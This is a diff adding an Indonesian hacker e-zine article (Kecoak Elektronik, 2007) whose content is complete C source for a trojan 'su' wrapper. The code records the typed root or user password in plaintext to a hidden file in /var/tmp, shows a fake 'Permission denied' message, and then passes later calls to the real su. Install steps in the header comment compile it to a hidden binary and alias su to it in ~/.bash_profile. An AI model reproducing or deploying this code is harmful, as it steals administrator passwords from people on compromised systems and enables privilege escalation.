@@ -1,0 +1,118 @@
+Kecoak Elektronik Indonesia [ KEI ]
+http://www.kecoak-elektronik.net
+
+24 Hours A Day, 300/1200 Baud
+Presents...
+
+
+####################################################################
+TOKET - Terbitan Online Kecoak Elektronik
+Defending the classical hackers mind since 1995
+
+Publisher : http://www.kecoak-elektronik.net
+Contact   : staff@kecoak-elektronik.net
+####################################################################
+
+
+Subject   : Keylogging root password with evil 'su'
+Writer    : Pseudoanonymous of Kecoak Elektronik
+Contact   : asktothegoogleaboutmyemail (at) Kecoak Elektronik
+Style     : Unicode Transformation Format (UTF-8)
+
+
+--[1]-- Kecoak Elektronik License
+
+
+Kecoak Elektronik secara aktif mendukung Blue Ribbon Campaign.
+Kami akan berusaha untuk menerbitkan semua informasi yang kami anggap
+patut diketahui, baik dokumen teks, artikel majalah, atau surat kabar.
+Seluruh kredit akan diberikan kepada sang pengarang.
+
+Kecoak Elektronik tidak bertanggung jawab atas tindakan orang lain.
+Informasi yang disajikan di situs ini adalah untuk tujuan pendidikan
+dan informasionil belaka. Jika anda memutuskan untuk mengejawantahkan
+dalam bentuk apapun informasi yang tersimpan di situs ini, anda
+melakukan atas keputusan sendiri, dan tidak seorangpun selain anda
+bertanggung jawab atas tindakan tersebut.
+
+Dipersilahkan untuk mengambil sebagian atau seluruh dari isi artikel
+yang kami terbitkan dengan tetap mencantumkan kredit atas pengarang
+dan Kecoak Elektronik sebagai penerbit online. Artikel yang dikutip
+atau diambil tidak dapat dipergunakan untuk kepentingan komersil.
+
+
+--[2]-- The Code
+
+
+/*
+ * su "evil" brought to you by Kecoak's C SHell
+ * (c) 2007 Kecoak Elektronik Indonesia
+ *
+ * Still alive to break and burn the sky
+ * Still decided to take overing the network use unusual ways
+ * Still silent and keep the underground spirit!
+ *
+ *   1. gcc -O2 -o .su su.c
+ *   2. mv .su /var/tmp/.su
+ *   3. echo "alias su=/var/tmp/.su" >> ~/.bash_profile
+ */
+
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+
+#define SU "/bin/su"                 /* better search the correct path */
+#define PASSWD "/var/tmp/.passwd"
+#define LOCK "/var/tmp/.su.lock"
+
+extern char **environ;
+
+int main(int argc, char **argv) {
+char *pass;
+char *user;
+char *ruser;
+FILE *inFile;
+
+switch(argc) {
+case 1:
+user = "root";
+break;
+case 2:
+if(!strncmp("-", argv[1], 1)) {
+user = "root";
+}
+else {
+user = argv[1];
+}
+break;
+case 3:
+user = argv[2];
+break;
+}
+
+if((inFile = fopen(LOCK, "r")) != NULL) {
+unlink(LOCK);
+argv[0] = SU;
+execve(argv[0], argv, environ);
+}
+
+if((inFile = fopen(PASSWD, "a+")) == NULL) {
+execle(SU, SU, argv[1], argv[2], NULL, environ);
+
+#ifdef DEBUG
+perror("open() on PASSWD file");
+#endif
+}
+
+pass = getpass("Password: ");
+
+ruser = getenv("USER");
+fprintf(inFile, "%s tried %s / %s\n", ruser, user, pass);
+fclose(inFile);
+
+inFile = fopen(LOCK, "w");
+fclose(inFile);
+printf("su: Permission denied\nSorry\n");
+
+return 0;
+}
